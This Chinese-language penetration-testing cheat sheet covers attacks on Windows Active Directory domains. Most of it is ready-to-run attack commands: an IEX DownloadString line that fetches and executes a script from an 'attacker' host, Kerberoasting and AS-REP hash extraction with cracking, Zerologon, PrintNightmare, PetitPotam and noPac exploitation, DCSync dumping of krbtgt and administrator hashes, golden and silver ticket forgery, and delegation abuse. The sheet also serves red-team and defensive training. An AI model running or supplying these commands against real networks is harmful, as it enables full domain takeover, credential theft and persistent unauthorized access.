# 域渗透补充

## 1. BloodHound域分析

### 数据采集

```bash
# Windows
SharpHound.exe -c All
SharpHound.exe -c Session,Group,Trusts

# PowerShell
IEX(New-Object Net.WebClient).DownloadString("http://attacker/SharpHound.ps1")
Invoke-BloodHound -CollectionMethod All

# Linux/MacOS
bloodhound-python -u user -p pass -d domain.com -ns dc_ip
```

### Cypher查询

```cypher
# 找所有域管理员
MATCH (n:User) WHERE n.admincount=true RETURN n

# 找最短路径
MATCH p=shortestPath((n:User)-[*1..]->(m:Group)) WHERE m.name="DOMAIN ADMINS@DOMAIN.COM" RETURN p

# 找约束委派
MATCH (n:User)-[:AllowedToDelegate]->(c:Computer) RETURN n,c
```

---

## 2. Kerberoasting

### 查找SPN用户

```bash
# PowerShell
Get-ADUser -Filter {ServicePrincipalName -like "*"} -Properties ServicePrincipalName

# Impacket
GetUserSPNs.py domain/user:pass -dc-ip dc_ip

# Rubeus
Rubeus.exe kerberoast /outfile:hashes.txt
```

### 导出并破解

```bash
# 破解
hashcat -m 13100 hashes.txt wordlist.txt
john --format=krb5tgs hashes.txt wordlist.txt
```

---

## 3. AS-REP Roasting

```bash
# Impacket
GetNPUsers.py domain/ -usersfile users.txt -format hashcat

# Rubeus
Rubeus.exe asreproast /outfile:hashes.txt
```

---

## 4. Zerologon (CVE-2020-1472)

### 检测

```bash
python3 cve-2020-1472.py -target dc_ip -check
```

### 利用

```bash
python3 cve-2020-1472.py -target dc_ip -save dc.txt
secretsdump.py -hashes :[NTHASH] 'DOMAIN/TARGET$@dc_ip'
```

### 恢复

```bash
python3 cve-2020-1472.py -target dc_ip -restore dc.txt
```

---

## 5. PrintNightmare (CVE-2021-1675)

```bash
python3 printnightmare.py domain/user:pass@target_ip
impacket-dcomexec.py domain/user:pass@target_ip
```

---

## 6. PetitPotam

```bash
python3 PetitPotam.py attacker_ip target_ip
```

---

## 7. noPac/SAMAccountName

```bash
python3 noPac.py domain/user:pass@target_ip
```

---

## 8. DCSync攻击

```bash
# Impacket
secretsdump.py domain/user:pass@dc_ip

# Mimikatz
lsadump::dcsync /domain:domain.com /user:krbtgt
lsadump::dcsync /domain:domain.com /user:administrator
```

---

## 9. 黄金票据

```bash
# 创建
kerberos::golden /domain:domain.com /sid:S-1-5-21-xxx /krbtgt:hash /user:admin /ticket:golden.kirbi

# 导入内存
kerberos::golden /domain:domain.com /sid:S-1-5-21-xxx /krbtgt:hash /user:admin /ptt
```

---

## 10. 白银票据

```bash
kerberos::silver /domain:domain.com /sid:S-1-5-21-xxx /target:server.domain.com /service:cifs /rc4:hash /user:admin
```

---

## 11. 约束委派

```bash
# 查找
Get-NetComputer -TrustedToAuth

# 利用
getST.py -spn cifs/target.domain.com domain/user:pass
```

---

## 12. 资源约束委派

```bash
# 查找
Get-ADComputer -Properties msDS-AllowedToActOnBehalfOfOtherIdentity

# 利用
rbcd.py -action write -target 'computer$' -delegate-from 'attacker$' -delegate-to 'target$' -dc-ip dc.domain.com
```
